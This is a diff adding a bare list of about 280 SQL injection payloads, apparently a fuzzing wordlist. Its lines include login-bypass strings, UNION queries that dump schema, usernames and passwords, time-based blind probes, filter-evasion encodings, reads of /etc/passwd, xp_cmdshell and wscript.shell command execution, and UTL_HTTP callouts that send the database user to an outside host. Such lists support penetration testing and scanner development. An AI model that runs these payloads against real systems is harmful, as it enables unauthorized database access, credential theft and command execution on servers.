@@ -1,0 +1,288 @@
+ or 1=1 or ""=
+" or ""&"
+" or ""*"
+" or ""-"
+" or ""^"
+" or "x"="x
+"&"
+") or ("x")=("x
+")) or (("x"))=(("x
+"*"
+"-"
+"^"
+"a"" or 1=1--"
+"a"" or 3=3--"
+%27--iXhuMCk%0ALIMIT--MogMpTZGYi%0A1%2C1--TPjIJcnXAuX%0AUNION--llDCqlfYffk%0AALL--AtQHoRbN%0ASELECT--aaoghwWht%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28database%28%29--nXGeXoOEyHm%0AAS--tWKPbn%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23 
+%31%32%33%27%20%4C%49%4D%49%54%20%31%2C%31%20%55%4E%49%4F%4E%20%41%4C%4C%20%53%45%4C%45%43%54%20%43%4F%4E%43%41%54%28%30%78%33%61%37%33%37%32%37%37%33%61%2C%49%46%4E%55%4C%4C%28%43%41%53%54%28%64%61%74%61%62%61%73%65%28%29%20%41%53%20%43%48%41%52%29%2C%30%78%32%30%29%2C%30%78%33%61%36%64%37%39%36%34%33%61%29%23 
+' UNION SELECT IF(SUBSTRING(USER(),1,4)=0x726f6f74,BENCHMARK(100000000,RAND()),1) 
+' or ''&'
+' or ''*'
+' or ''-'
+' or ''='
+' or ''^'
+' or '1'='1'--
+' or 'x'='x
+' or 1 --'
+' or 1=1 or ''='
+' or uid like '%
+' or uname like '%
+' or user like '%
+' or userid like '%
+' or username like '%
+'%20AND%20SLEEP(10)=' 
+'%20or%20''='
+'%20or%20'x'='x
+'&'
+') or ('a'='a
+') or ('x')=('x
+')%20or%20('x'='x
+')) or (('x'))=(('x
+'); exec sp_executesql('W'+'ait'+'for'+' '+'de'+'lay'+' '+'00:00:40');-- 
+'*'
+'+or+1=utl_http.request('http://host/'||(select+user+from+dual))-- 
+'+or+round(pi(),1)+true+true = version() 
+'+where+(0)=0 
+'-'
+'; EXEC ('SEL' + 'ECT US' + 'ER') 
+'; EXECUTE IMMEDIATE  'SEL' || 'ECT US' || 'ER' 
+'; exec master..xp_cmdshell
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+'; exec xp_regread
+';/*&iid=1*/ EXEC/*&iid=1*/ master..xp_cmdshell /*&iid=1*/ "ping 127.0.0.1" /*&iid=1*/-- 
+';/*,1*/ EXEC /*,1*/ master..xp_cmdshell /*,1*/ "ping 127.0.0.1" /*,1*/-- 
+'=' 
+'^'
+'hi' or 'x'='x';
+'union select 1,load_file(0x2f6574632f706173737764),3 from users-- 
+'||UTL_HTTP.REQUEST('http://somehost/')||' 
+'||utl_inaddr.get_host_name((select+user+from+dual)) 
+(1)rlike(if(mid(@@version,1,1)like(5),0x28,1)) 
+(coalesce(length(load_file(0x2F6574632F706173737764)),1)) 
++if(ASCII(SUBSTRING((1
++or+round(pi(),1)+true+true = version() 
+-2 0/**/union/*!50000select*/ 1,2,3--
+-2 and (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) /*!50000union*/ select 1,version(),3,4,5,6,7,8,9--
+-2 or 1=convert(int,(USER))--
+-2 || (select substr(gruop_concat(user_id),1,1) user from users ) = 1
+-2 || (select user from users limit 1) = 'admin'
+-2 || substr(user,1,1) = lower(conv(11,10,36))
+-2%20UnIon%20SElect%201,2,3--
+-2%20Union%20Select%201,2,3--
+-2(/*!50000%53elect*/%0A/*!50000%54able_name*/%0A%0A/*!50000%46roM*/%0A/*!50000%49nfORmaTion_%53cHema . %54AblES*/%0A/*!50000%57here*/%0A%54able_ScHEmA=schEMA()%0Alimit%0A0,1) 
+-2+%0A%0D/*!%0A%0Dunion*/+%0A%0D/*!50000Select*/%0A%0D/*!+77771,77772,unhex(hex(/*!password*/)),77774+from+/*!`users`*/-- - 
+-2+and+(select 1)=(select 0x414141414141441414141414114141414141414141414141414141414141414141.)+union+select+1,2,version(),database(),user(),6,7,8,9,10--
+-2/*!UnIoN*/+/*!SeLecT*/+1,2,concat(/*!table_name*/)+FrOm/*!information_schema*/.tables/*!WhErE*/+/*!TaBlE_sChEMa*/+like+database()--
+-20+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
+-20+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
+-20+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
+-20+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
+-20+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
+-2‘ and substr((select max(pass) from users),1,1)=’a
+-2‘ and substr((select max(replace(pass,’lastpw’,”)) from users),1,1)=’a
+.0 union select /**/1,2,3--
+.2'/*!50000UNION*//*!50000SELECT*/1,2,3-- -
+0^(locate(0x61,(select id from users where num=1),1)=1) 
+1  UNION ALL SELECT LOAD_FILE('/etc/passwd')
+1 ";DECLARE @shell INT EXEC SP_OAcreate 'wscript.shell',@shell OUTPUT EXEC SP_OAMETHOD @shell,'run',null, 'C:
+1 "UNION%20%28SELECT%201,username,3,4,passwd,6,7,8,9,10,11,12,13,14,15,16,17,18%20from%28admin%29%29
+1 /*!union*/ /*!select*/  user,password /*!from*/ mysql.user
+1 /**/union/**/select/**/1,load_file(0x633A5C626F6F742E696E69),3/*
+1 ;declare @d int;--
+1 ;exec master..dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll';--
+1 ;insert into user(username,password) values('xxxx',' xxxx'),('dddd','dddd')/* ');
+1 ;select BENCHMARK(100000,SHA1('true')), false);--
+1 =-9%0Aunion%0Aselect 1,2,3,4"
+1 And (Select char(124)%2BCast(Count(1) as varchar(8000))%2Bchar(124) From D99_Tmp)=0 ;--
+1 And char(124)%2BCast(HAS_DBACCESS('master') as varchar(1))%2Bchar(124)=1 --
+1 And char(124)%2BCast(IS_MEMBER('db_owner') as varchar(1))%2Bchar(124)=1 ;--
+1 And char(124)%2BCast(IS_SRVROLEMEMBER(0x730079007300610064006D0069006E00) as varchar(1))%2Bchar(124)=1 --
+1 GRANT ALL PRIVILEGES ON *.* TO test1@'%';
+1 GROUP BY colume_got having 1=1
+1 IF (1=1) SELECT 1 ELSE SELECT 2
+1 SELECT DB_NAME() 
+1 SELECT HOST_NAME() 
+1 SELECT cast('1' AS unsigned integer);
+1 SELECT char(0x41)
+1 SELECT user_name();
+1 and (se%%lect top 1 password from [admin])=0
+1 and 100>(Select ASCII(Substr(username,1,1))) from all_users where rownum<=1) 
+1 and 1= (Select HAS_DBACCESS('master'))
+1 and 1=(Select IS_MEMBER('db_owner'))
+1 and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') 
+1 and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
+1 and 9=8 /*!uNiOn*/ aLl /*!sElect*/ 1,2,3-- 
+1 and char(124)%2Buser%2Bchar(124)=0
+1 and exists (select * from sysobjects);--
+1 and ord(mid(version(),1,1))>51/*
+1 and substring(version(),1,1)=4 
+1 or 'ab'='ab
+1 or benchmark(100000000,MD5(1))#
+1%0Aunion%0Aselect%0A1,2,3/* 
+1%20%20%20%20union%20%20%20%20select%20%20%20%20abc%20%20%20%20from%20%20%20%20abc 
+1%20%20union%20%20select%20%20abc%20%20from%20%20abc 
+1%20union%20/*!select*/%20/*!@@datadir*/ 
+1' AND 1=UTL_INADDR.get_host_address('n0where329.z0m')--
+1' or benchmark(100000000,MD5(1))#
+1'%0Band%0B''=' 
+1'%0Cand%0C''=' 
+1'%0Dand%0D''=' 
+1'&&1='1 
+1') or benchmark(100000000,MD5(1))#
+1')) or benchmark(100000000,MD5(1))#
+1')); waitfor delay '0:0:X'--
+1'); waitfor delay '0:0:X'--
+1'+and+(select+pass+from+users+limit+1)='pass-- 
+1'+and+(select+substr(group_concat(pass),1,1)+from+users)='a 
+1'OR'121'='121 
+1'union/*!select*/pass,load_file(0x11)from+users-- 
+1) or benchmark(100000000,MD5(1))#
+1)) or benchmark(100000000,MD5(1))#
+1)); waitfor delay '0:0:X'--
+1),(version(),1,1 
+1); waitfor delay '0:0:X'--
+1+and+100>(ASCII(Substring(user(),1,1))) 
+1+and+100>(Select+top+1+ASCII(Substring(name,1,1))) from sysusers)-- 
+1+and+ascii('a')=97 
+1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 
+1+and+ascii(lower(substring((select+pwd+from+users+limit+1,1),1,1)) 
+1+and+hex('a')=61 
+1+and+length(123)=3 
+1+and+ord('a') = 97 
+1/(select UTL_INADDR.get_host_address('n0where329.z0m') from dual)--
+1/*union*/union/*select*/select+1,2,3/* 
+10+UNION+SELECT+LOAD_FILE(0x2f6574632f706173737764) 
+123%27%20%20%20%20LIMIT%20%20%201%2C1%20%20UNION%20%20%20%20%20ALL%20%20%20%20%20%20%20SELECT%20%20%20%20%20CONCAT%280x3a6d70663a%2C%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20CHAR%20%29%2C0x20%29%2C0x3a736e623a%29%23 
+123%27%20%20AND%20%20%20%28%20%20SELECT%20%20%20%202937%20%20%20FROM%28%20%20SELECT%20%20%20%20%20COUNT%28%2A%29%2C%20%20CONCAT%280x3a6d70663a%2C%28%20%20SELECT%20%20%20%20MID%28%28%20%20IFNULL%28%20CAST%28%20%20database%28%29%20%20%20AS%20%20%20%20%20%20%20CHAR%20%20%29%2C0x20%29%29%2C1%2C50%29%29%2C0x3a736e623a%2CFLOOR%28RAND%280%29%2A2%29%29x%20%20%20%20FROM%20%20%20%20INFORMATION_SCHEMA.CHARACTER_SETS%20%20%20%20GROUP%20%20%20%20%20BY%20%20%20%20x%29a%29%20%20AND%20%20%20%27rmHN%27=%27rmHN 
+123%27%20%2F%2A%2100000LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6a7a713a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a79757a3a%29%2A%2F%23 
+123%27%20%2F%2A%2130631LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a69626b3a%29%2A%2F%2 
+123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6864723a%2CIF%28ISNULL%28CAST%28version%28%29%20AS%20CHAR%29%29%2C0x20%2CCAST%28version%28%29%20AS%20CHAR%29%29%2C0x3a7767793a%29%23 
+123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23%20and%20%270having%27=%270having%27 
+123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2C%28CASE%20WHEN%20%286349=6349%2F%2A%2150521%20AND%206349=6350%2A%2F%29%20THEN%201%20ELSE%200%20END%29%2C0x3a6270793a%29%23 
+123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6e75773a%2CIFNULL%28CAST%28CURRENT_USER%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a6270793a%29%23 
+123%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a757a793a%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736a763a%29%23%00 
+123%27%23DDvIMgC%0ALIMIT%23wyQDiZxbEfWH%0A1%2C1%23vJHSbhW%0AUNION%23WfNzMdJBEP%0AALL%23AgDqJl%0ASELECT%23xRYClbEPoiuX%0ACONCAT%280x3a7372773a%2CIFNULL%28CAST%28version%28%29%23BiJwsArZs%0AAS%23FgnwSFSQ%0ACHAR%29%2C0x20%29%2C0x3a6d79643a%29%23 
+123%27%23mPkKCjceC%0A%23pwsxOHFa%0ALIMIT%23GSTpANJXKGdC%0A%23uOaAVrPY%0A%23IufLHavTgnn%0A%23sRygbynG%0A1%2C1%23uRvizI%0A%23kNTIVAJnz%0AUNION%23IEVjNIbBGg%0A%23CrHaTy%0A%23PkPohIaUPUPP%0A%23ouAusiVKpxg%0A%23UTlHCuTls%0AALL%23ZdLRhsQPAkid%0A%23ObZxIruvjFbd%0A%23IxosRHsTC%0A%23lZlmVvV%0ASELECT%23FHaHzAMzvN%0A%23BWRjqHuR%0A%23BTtMGfzKairL%0A%23GvGSlRR%0A%23kbCsPv%0A%23kiirXiLzYG%0A%23RkKvrFrkKc%0ACONCAT%280x3a6267653a%2C%23TLxyzUYCN%0A%23iKDnXTOMyUX%0AIFNULL%28%23KLWKJH%0ACAST%28%23EVVXxVJ%0A%23ddeBcXdPJNK%0A%23JytbHTOvwXC%0Aversion%28%29%23OXQNXTG%0A%23JqAzVQn%0A%23uYcIYOA%0A%23xBATyw%0AAS%23SuQdAyf%0A%23hQHYtT%0A%23ReByaH%0A%23COkovdqzzcS%0A%23nJrotVbdX%0ACHAR%23NklnJgTSwC%0A%23StUlDCtwD%0A%23EHSUPhSgYLrO%0A%29%2C0x20%29%2C0x3a69626b3a%29%23%20and%20%270having%27=%270having%27 
+123%27%2BLIMIT%2B1%2C1%2BUNION%2BALL%2BSELECT%2BCONCAT%280x3a6267653a%2CIFNULL%28CAST%28version%28%29%2BAS%2BCHAR%29%2C0x20%29%2C0x3a69626b3a%29%23 
+123%27%2F%2A%210LIMIT%201%2C1%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210CONCAT%280x3a6267653a%2C%2F%2A%210IFNULL%28CAST%28%2F%2A%210version%28%29%2F%2A%210AS%2F%2A%210CHAR%29%2C0x20%29%2C0x3a69626b3a%29%23 
+123%27%2F%2A%21LIMIT%2A%2F1%2C1%2F%2A%21UNION%2A%2F%2F%2A%21ALL%2A%2F%2F%2A%21SELECT%2A%2F%2F%2A%21CONCAT%2A%2F%280x3a6a7a713a%2C%2F%2A%21IFNULL%2A%2F%28CAST%28%2F%2A%21database%2A%2F%28%29%2F%2A%21AS%2A%2F%2F%2A%21CHAR%2A%2F%29%2C0x20%29%2C0x3a79757a3a%29%23 
+123%29%20%20%20%20AND%20%20%20%20%208558=8593%20%20AND%20%20%20%20%20%20%285473=5473 
+123%29%20%20AND%20%20%20%208558=8593%20%20AND%20%20%20%20%285473=5473 
+123%29%20%2F%2A%2100000AND%203244=4853%20AND%20%286013=6013%2A%2F 
+123%29%20AND%20%28SELECT%205524%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6864723a%2C%28SELECT%20%28CASE%20WHEN%20%285524%20LIKE%205524%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a7767793a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29%20AND%20%287619%20LIKE%207619 
+123%29%20AND%201701=5451%20AND%20%283835=3835%20and%20%270having%27=%270having%27 
+123%29%20AND%202874%20LIKE%202341%20AND%20%288194%20LIKE%208194 
+123%bf%27%20LIMIT%201%2C1%20UNION%20ALL%20SELECT%20CONCAT%280x3a6d70663a%2CIFNULL%28CAST%28database%28%29%20AS%20CHAR%29%2C0x20%29%2C0x3a736e623a%29%23--%20 
+123'+not+like+'1234 
+123+AND+md5('a')!= md5('A') 
+123/*!or*/1=1; 
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+16+/*!UniOn*/+/*!AlL*/+/*!SeLecT*/+1,2,3,4,5,6,version()-- 
+2 %23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
+2 uni%6fn distinct%52OW s%65lect
+2 unio%6e%20%64istinc%74%20%73elect
+2 union(select(0),version(),(0),(0),(0),(0),( 0),(0),(0))
+2' and false /*!50000UNION*/ALL+SELECT*from(select /*!50000GrOup_CoNcat(merda SEPARATOR '')*/from(select 0x223e3c2f613e3c2f6469763e3c2f6469763e3c2f74683e3c2f74723e3c2f7461626c653e3c666f6e7420636f6c6f723d22726564223e3c62723e3c623e496e6a6563746564206279205a454e3c2f623e3c62723e56657273696f6e203a3a20 merda /*!50000union*/select version()/*!50000union*/select 0x3c62723e4461746162617365203a3a20/*!50000union*/select database()/*!50000union*/select 0x3c2f666f6e743e3c62723e3c62723e3c666f6e7420636f6c6f723d22677265656e223e3c753e3a3a205461626c657320466f756e64203a3a203c2f753e3c6c693e/*!50000union*/select/*!50000group_coNcAt(table_name SEPARATOR 0x3c6c693e)*/from/*!50000InFormation_schema.tables*//*!50000where+*/table_schema=/*!50000database()*/)lol)a1 join(select(0x3133333732))a2 join(select(0x3133333733))a3 join(select(0x3133333734))a4 join(select(0x3133333735))a5 join(select(0x3133333736))a6--+
+2'UnION distinctrow Select 0x2e312929556e494f6e2064697374696e63742053656c65637420312c322c332c342c352c362c372c382c392c31302c31312c31322c31332c31342c31352c31362c313723-- -
+2'UnION distinctrow Select 1,2-- -
+2'UnION distinctrow Select x'2e312929556e494f6e2053656c65637420312c322c332c342c352c362c372c382c392c31302c31312c31322c31332c31342c31352c31362c313723'-- -
+2+and+(select 1)=(Select 0xAA[..(add about 1000 “A”)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4
+2/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/+/*!20000%0d%0a1,2,3--*/
+2/*!UNION*/ +/*!ALL*/+/*!SELECT*/+1,2,3,4-- -
+20+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
+20+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
+20+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
+20+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
+20+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
+8888'+AND+'1'+LIKE+'1 -->
+8888'+AND+'2'+LIKE+'1 -->
+8888'+AND+(@@LANGID>@@TEXTSIZE)+'1'+LIKE+'1 -->
+8888'+AND+(@@TEXTSIZE>@@LANGID)+AND+'1'+LIKE+'1 -->
+BENCHMARK(1000000000,MD5(CHAR(116))) 
+IF(SUBSTRING(USER(),1,4)=0x726f6f74,SLEEP(5),1) 
+SELECT 'A' <=> 'Ä', 'é' = 'E', 'u' = 'Ü';
+SELECT 'foobar' = 'foo' + /* foo */ + 'bar ';
+SELECT @a:=26143544982.875,@b:=16,unhex(hex(@a*@b)); #'admin'
+SELECT CHR(84)||CHR(69)||CHR(83)||CHR(84)a FROM user_tables;
+SELECT UpdateXML('<script x=_></script>', '/script/@x', 'src=//0x.lv');
+SELECT UpdateXML(concat(0x3c,'script',0x3e,'alert(1)',0x3c,'/script',0x3e),'/x', 0)
+SELECT concat(char(x'70617373'),char(b'1110111011011110111001001100100')) #"password"
+SELECT q'<foobar>' FROM test
+SELECT unhex(414141)
+SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61));
+SELECT@,/*!00000@a:=26143544982.875,@b:=x'3136',*/unhex(hex(@a*@b)) #'admin'
+SELECT@:=/*!00000UNHEX(*//*!99999x*/N'3136′/*!00000)*/
+SELECT@:=/*!111111||1*/
+SELECT@a:=(@b:=1); # selects 1 as well
+SET @c = CONCAT(REPLACE(MAKE_SET(5,'SEL','xxxxx','ECT'), ',', ''),' 1');PREPARE s FROM @c;EXECUTE s; 
+SET @c = CONCAT(_latin1 b'01010011',_latin1 b'01100101',_latin1 b'01001100',_latin1 b'01100101',_latin1 b'01100011',_latin1 b'01110100',' ',_latin1 b'00110001');PREPARE s FROM @c;EXECUTE s; 
+SET @c = CONCAT(b'01010011',b'01100101',b'01001100',b'01100101',b'01100011',b'01110100',' ',b'00110001');PREPARE s FROM @c;EXECUTE s; 
+a" and "456"="678
+a" and "fghi"="fghj"-- #
+a" or "345"="345
+a" or "dfth"="dfth"-- #
+a' and '456'='678
+a' and 'fghi'='fghj'#
+a' and 'fghi'='fghj'--
+a' and 'fghi'='fghj'-- #
+a' or '345'='345
+a' or 'a' = 'a
+a' or 'dfth'='dfth'#
+a' or 'dfth'='dfth'--
+a' or 'dfth'='dfth'-- #
+a' order by 1--
+a' waitfor delay '0:0:10'--
+admin" or "1"="1
+admin" or "1"="1"#
+admin" or "1"="1"--
+admin" or "1"="1"/*
+admin" or 1=1/*
+admin") or "1"="1
+admin") or "1"="1"#
+admin") or "1"="1"--
+admin") or "1"="1"/*
+admin") or ("1"="1
+admin") or ("1"="1"#
+admin") or ("1"="1"--
+admin") or ("1"="1"/*
+admin"/*
+admin"or 1=1 or ""="
+admin' or '1'='1
+admin' or '1'='1'#
+admin' or '1'='1'--
+admin' or '1'='1'/*
+admin' or 1=1/*
+admin') or '1'='1
+admin') or '1'='1'#
+admin') or '1'='1'--
+admin') or '1'='1'/*
+admin') or ('1'='1
+admin') or ('1'='1'#
+admin') or ('1'='1'--
+admin') or ('1'='1'/*
+admin'/*
+admin'/* 
+admin'or 1=1 or ''='
+anything' OR 'x'='x
+case when name=0x5265696E657273 then 1 else 0 end 
+declare @q nvarchar (4000) select @q =
+hi or 1=1 --"
+hi' or 'a'='a
+hi') or ('a'='a
+if(if((name)like(0x61646D696E),1,0),if(mid((password),1,1)like(0x61),id,0),0);%00 
+if(substring(USER(),1,4)=0x726f6f74,SLEEP(5),1) 
+null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3
+null+UNION+SELECT+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+INFORMATION_SCHEM.COLUMNS+WHERE+TABLE_NAME=Admin--   
+null+UNION+SELECT+1,GrOUp_COnCaT(id,login,password,email),3,4,5+FrOm+Admin—
+null+UnIoN+SeLeCt+1,GrOUp_COnCaT(SCHEMA_NAME),3,4,5+FROM+INFORMATION_SCHEM.SCHEMATA--
+null+UnIoN+sELeCT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+INFORMATION_SCHEM.TABLES+WHERE+TABLE_SCHEMA=DATABASE()--    
+null+UnIoN+sElEcT+1,CoNcAt(database(),user(),version()),3,4,5-- 
+union(select(version())) 
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND 1=(SELECT COUNT(*) FROM tabname);-- 
+x' AND email IS NULL; --
+x' AND members.email IS NULL; --
+x' AND userid IS NULL; --
+x' OR full_name LIKE '%Bob%
+x' or 1=1 or 'x'='y
+x';UPDATE+aa+set+1='2'-- 
